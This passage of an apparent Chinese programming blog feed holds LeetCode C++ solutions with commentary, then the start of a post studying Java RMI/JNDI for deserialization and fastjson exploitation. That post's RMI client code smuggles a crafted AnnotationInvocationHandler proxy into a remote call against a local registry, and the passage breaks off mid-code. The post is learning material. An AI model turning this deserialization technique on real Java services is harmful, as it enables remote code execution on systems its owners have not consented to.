class="line">			<span class="keyword">while</span> (i + count[i] &lt; str.size() - <span class="number">1</span> &amp;&amp; i - count[i] &gt;<span class="number">0</span> &amp;&amp; (str[i + count[i] + <span class="number">1</span>] == str[i - count[i] - <span class="number">1</span>]))</span><br><span class="line">			&#123;</span><br><span class="line">				count[i]++;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">			<span class="keyword">if</span> (count[i] + i &gt; mx)</span><br><span class="line">			&#123;</span><br><span class="line">				mx = count[i] + i;</span><br><span class="line">				id = i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count.size(); i ++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (count[i] &gt; longest.size())</span><br><span class="line">			&#123;</span><br><span class="line">				longest = s.substr(i / <span class="number">2</span> - count[i] / <span class="number">2</span>, count[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> longest;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><h1 id="ZigZag-Conversion"><a href="#ZigZag-Conversion" class="headerlink" title="ZigZag Conversion"></a>ZigZag Conversion</h1></li>
</ol>
<p>The string <code>&quot;PAYPALISHIRING&quot;</code> is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)</p>
<p>P   A   H   N<br>A P L S I I G<br>Y   I   R</p>
<p>And then read line by line: <code>&quot;PAHNAPLSIIGYIR&quot;</code>Write the code that will take a string and make this conversion given a number of rows:</p>
<p>string convert(string text, int nRows);</p>
<p><code>convert(&quot;PAYPALISHIRING&quot;, 3)</code> should return <code>&quot;PAHNAPLSIIGYIR&quot;</code>.</p>
<p>这题感觉挺无脑的, ZigZag到底是啥题目也没说清楚…只要理解了下面这张大佬发在评论区的表就行了.(1315人踩这道题, 是赞的4倍233)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*n&#x3D;numRows</span><br><span class="line">Δ&#x3D;2n-2    1                           2n-1                         4n-3</span><br><span class="line">Δ&#x3D;        2                     2n-2  2n                    4n-4   4n-2</span><br><span class="line">Δ&#x3D;        3               2n-3        2n+1              4n-5       .</span><br><span class="line">Δ&#x3D;        .           .               .               .            .</span><br><span class="line">Δ&#x3D;        .       n+2                 .           3n               .</span><br><span class="line">Δ&#x3D;        n-1 n+1                     3n-3    3n-1                 5n-5</span><br><span class="line">Δ&#x3D;2n-2    n                           3n-2                         5n-4</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="built_in">string</span> <span class="title">convert</span><span class="params">(<span class="built_in">string</span> s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (numRows == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> s;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">string</span> answer;</span><br><span class="line">		<span class="keyword">int</span> size = s.size();</span><br><span class="line">		<span class="keyword">int</span> count;</span><br><span class="line">		<span class="keyword">int</span> shift;</span><br><span class="line"></span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; (numRows * j - count) &lt; size; j += <span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			answer.push_back(s[numRows * j - count]);</span><br><span class="line">			count += <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (numRows &gt; <span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			shift = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; numRows - <span class="number">1</span>; ++i)</span><br><span class="line">			&#123;</span><br><span class="line">				count = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> ((numRows * j + i - count) &lt; size)</span><br><span class="line">					&#123;</span><br><span class="line">						answer.push_back(s[numRows * j + i - count]);</span><br><span class="line">						count += <span class="number">2</span>;</span><br><span class="line">						j += <span class="number">2</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;				</span><br><span class="line">					<span class="keyword">if</span> ((numRows * j + i - count - shift) &lt; size)</span><br><span class="line">					&#123;</span><br><span class="line">						answer.push_back(s[numRows * j + i - count - shift]);</span><br><span class="line">					&#125;	</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;				</span><br><span class="line">				&#125;</span><br><span class="line">				shift+=<span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; (numRows * j + numRows - <span class="number">1</span> - count) &lt; size; j += <span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			answer.push_back(s[numRows * j + numRows - <span class="number">1</span> - count]);</span><br><span class="line">			count += <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> answer; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><h1 id="Reverse-Integer"><a href="#Reverse-Integer" class="headerlink" title="Reverse Integer"></a>Reverse Integer</h1></li>
</ol>
<p>Given a 32-bit signed integer, reverse digits of an integer. <strong>Example 1:</strong></p>
<p>Input: 123<br>Output:  321</p>
<p><strong>Example 2:</strong></p>
<p>Input: -123<br>Output: -321</p>
<p><strong>Example 3:</strong></p>
<p>Input: 120<br>Output: 21</p>
<p><strong>Note:</strong> Assume we are dealing with an environment which could only hold integers within the 32-bit signed integer range. For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows. Easy题, 没啥难度0.0, 但是大佬确实是大佬啊, 可以用短很多的代码写出来同样的效果.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		getReverse(x, result);</span><br><span class="line">		<span class="keyword">if</span> (result == INT_MAX || result == INT_MIN)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">getReverse</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> &amp;result)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> digits;</span><br><span class="line">		<span class="keyword">int</span> remain = x % <span class="number">10</span>;</span><br><span class="line">		x -= remain;</span><br><span class="line">		x /= <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">if</span> (x == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			result += remain;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			digits = getReverse(x, result);</span><br><span class="line">			result += remain * (<span class="built_in">pow</span>(<span class="number">10</span>, digits));</span><br><span class="line">			digits++;</span><br><span class="line">			<span class="keyword">return</span> digits;</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> answer = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">            answer = answer * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (answer &gt; INT_MAX || answer &lt; INT_MIN) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="8">
<li><h1 id="String-to-Integer-atoi"><a href="#String-to-Integer-atoi" class="headerlink" title="String to Integer (atoi)"></a>String to Integer (atoi)</h1></li>
</ol>
<p>Implement <code>atoi</code> to convert a string to an integer. <strong>Hint:</strong> Carefully consider all possible input cases. If you want a challenge, please do not see below and ask yourself what are the possible input cases. <strong>Notes:</strong> It is intended for this problem to be specified vaguely (ie, no given input specs). You are responsible to gather all the input requirements up front. <strong>Requirements for atoi:</strong> The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value. The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function. If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed. If no valid conversion could be performed, a zero value is returned. If the correct value is out of the range of representable values, INT_MAX (2147483647) or INT_MIN (-2147483648) is returned.  </p>
<p>我只能说那么多踩是有原因的…题目看上去很长实际上该说的都没有说, 比如说指数, 又比如+-1是否正确等等.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">toNum</span><span class="params">(<span class="keyword">char</span> chr)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (chr &lt;= <span class="number">57</span> &amp;&amp; chr &gt;= <span class="number">48</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> chr - <span class="number">48</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">bool</span> isNeg = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">bool</span> haveSym = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">long</span> <span class="keyword">long</span> value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">auto</span> itr = str.begin();</span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (*itr == <span class="string">' '</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				++itr;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (\*itr == <span class="string">'-'</span> || \*itr == <span class="string">'+'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (*itr == <span class="string">'-'</span>) </span><br><span class="line">			&#123;</span><br><span class="line">				isNeg = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			haveSym = <span class="literal">true</span>;</span><br><span class="line">			itr++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (haveSym == <span class="literal">true</span> &amp;&amp; (\*itr == <span class="string">'+'</span> || \*itr == <span class="string">'-'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (itr != str.end() &amp;&amp; *itr != <span class="string">' '</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> num = toNum(*itr);</span><br><span class="line">			<span class="keyword">if</span> (num == <span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (isNeg)</span><br><span class="line">			&#123;</span><br><span class="line">				value *= <span class="number">10</span>;</span><br><span class="line">				value -= num;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				value *= <span class="number">10</span>;</span><br><span class="line">				value += num;</span><br><span class="line">			&#125;</span><br><span class="line">			itr++;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (value &gt; INT_MAX)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> INT_MAX;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (value &lt; INT_MIN)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> INT_MIN;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (value &gt; INT_MAX)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> INT_MAX;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (value &lt; INT_MIN)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> INT_MIN;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> value;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="9">
<li><h1 id="Palindrome-Number"><a href="#Palindrome-Number" class="headerlink" title="Palindrome Number"></a>Palindrome Number</h1></li>
</ol>
<p>Determine whether an integer is a palindrome. Do this without extra space.</p>
<p><strong>Some hints:</strong>Could negative integers be palindromes? (ie, -1) If you are thinking of converting the integer to string, note the restriction of using extra space. You could also try reversing an integer. However, if you have solved the problem “Reverse Integer”, you know that the reversed integer might overflow. How would you handle such case? There is a more generic way of solving this problem.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> reverse = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> copy = x;</span><br><span class="line">		<span class="keyword">while</span> (x &gt;= <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			reverse *= <span class="number">10</span>;</span><br><span class="line">			<span class="keyword">int</span> remain = (x % <span class="number">10</span>);</span><br><span class="line">			reverse += remain;</span><br><span class="line">			x -= remain;</span><br><span class="line">			x /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> reverse == copy;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="10">
<li><h1 id="Regular-Expression-Matching"><a href="#Regular-Expression-Matching" class="headerlink" title="Regular Expression Matching"></a>Regular Expression Matching</h1></li>
</ol>
<p>Implement regular expression matching with support for <code>&#39;.&#39;</code> and <code>&#39;*&#39;</code>.</p>
<p>‘.’ Matches any single character.<br>‘*’ Matches zero or more of the preceding element.</p>
<p>The matching should cover the entire input string (not partial).</p>
<p>The function prototype should be:<br>bool isMatch(const char *s, const char *p)</p>
<p>Some examples:<br>isMatch(“aa”,”a”) → false<br>isMatch(“aa”,”aa”) → true<br>isMatch(“aaa”,”aa”) → false<br>isMatch(“aa”, “a*”) → true<br>isMatch(“aa”, “.*”) → true<br>isMatch(“ab”, “.*”) → true<br>isMatch(“aab”, “c*a*b”) → true</p>
<p>这道题为hard, 确实很有难度, 不看答案没有想到递归这个骚操作233 这里用迭代器就很方便, 省去了传参时的浪费.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:	</span><br><span class="line">	<span class="built_in">string</span>::iterator textEnd;</span><br><span class="line">	<span class="built_in">string</span>::iterator regEnd;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">isMatch</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> p)</span> </span>&#123;</span><br><span class="line">		textEnd = s.end();</span><br><span class="line">		regEnd = p.end();</span><br><span class="line">		<span class="keyword">return</span> match(s.begin(), p.begin());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">match</span><span class="params">(<span class="built_in">string</span>::iterator text, <span class="built_in">string</span>::iterator reg)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (reg == regEnd) &#123;</span><br><span class="line">			<span class="keyword">return</span> text == textEnd;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">bool</span> charMatch = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span> (text != textEnd &amp;&amp; (\*reg == \*text || *reg == <span class="string">'.'</span>)) &#123;</span><br><span class="line">			charMatch = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (regEnd - reg &gt;= <span class="number">2</span> &amp;&amp; *(reg + <span class="number">1</span>) == <span class="string">'*'</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> match(text, reg + <span class="number">2</span>) || (charMatch &amp;&amp; match(text + <span class="number">1</span>, reg));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> charMatch &amp;&amp; match(text + <span class="number">1</span>, reg + <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>你还可以加上缓存, 避免重复的运算.加上后提升还是非常大的.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:	</span><br><span class="line">	<span class="built_in">string</span>::iterator textEnd;</span><br><span class="line">	<span class="built_in">string</span>::iterator regEnd;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">isMatch</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> p)</span> </span>&#123;</span><br><span class="line">		textEnd = s.end();</span><br><span class="line">		regEnd = p.end();</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; cache(s.size() + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(p.size() + <span class="number">1</span>, <span class="number">-1</span>));</span><br><span class="line">		<span class="keyword">return</span> match(s.begin(), p.begin(), cache);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">match</span><span class="params">(<span class="built_in">string</span>::iterator text, <span class="built_in">string</span>::iterator reg , <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;cache)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> textIndex = textEnd - text;</span><br><span class="line">		<span class="keyword">int</span> regIndex = regEnd - reg;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (cache[textIndex][regIndex] != <span class="number">-1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> cache[textIndex][regIndex];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (reg == regEnd) &#123;</span><br><span class="line">			<span class="keyword">return</span> text == textEnd;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">bool</span> charMatch = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span> (text != textEnd &amp;&amp; (\*reg == \*text || *reg == <span class="string">'.'</span>)) &#123;</span><br><span class="line">			charMatch = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (regEnd - reg &gt;= <span class="number">2</span> &amp;&amp; *(reg + <span class="number">1</span>) == <span class="string">'*'</span>) &#123;</span><br><span class="line">			<span class="keyword">bool</span> temp = match(text, reg + <span class="number">2</span>, cache) || (charMatch &amp;&amp; match(text + <span class="number">1</span>, reg, cache));</span><br><span class="line">			cache[textIndex][regIndex] = temp;</span><br><span class="line">			<span class="keyword">return</span> temp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">bool</span> temp = charMatch &amp;&amp; match(text + <span class="number">1</span>, reg + <span class="number">1</span> ,cache);</span><br><span class="line">			cache[textIndex][regIndex] = temp;</span><br><span class="line">			<span class="keyword">return</span> temp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>cpp</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA JNDI / RMI 学习</title>
    <url>/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>RMI / JNDI 在反序列化, fastjson 漏洞利用的时候都经常出现, 学习一下.</p>
<a id="more"></a>

<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>盗一张图  </p>
<p><img src="https://i.loli.net/2020/02/19/pMiX4BNVRzeadD6.png" alt="1.png"></p>
<p>加上一些示例,  </p>
<p>RMIServer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry reg = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIServiceProvider.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServiceProvider</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line">        TestObjectImpl obj = <span class="keyword">new</span> TestObjectImpl();</span><br><span class="line">        TestObject services = (TestObject) UnicastRemoteObject.exportObject(obj, <span class="number">0</span>);</span><br><span class="line">        registry.bind(<span class="string">"test"</span>, services);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteRef;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        DeserializeObject deserializeObject = <span class="keyword">new</span> DeserializeObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;Class.class, Map.class&#125;);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(<span class="string">"aaa"</span>, deserializeObject);</span><br><span class="line">        InvocationHandler obj = (InvocationHandler) constructor.newInstance(Deprecated.class, hashMap);</span><br><span class="line"></span><br><span class="line">        TestObject services = (TestObject) registry.lookup(<span class="string">"test"</span>);</span><br><span class="line">        CharSequence proxy = (CharSequence) Proxy.newProxyInstance(String.class.getClassLoader(), String.class.getInterfaces(), obj);</span><br><span class="line">        services.callMe(proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TestObject</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">callMe</span><span class="params">(Dummy input)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestObjectImpl</span> <span class="keyword">implements</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">callMe</span><span class="params">(Dummy input)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"callMe: "</span> + input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DummyImpl</span> <span class="keyword">implements</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span 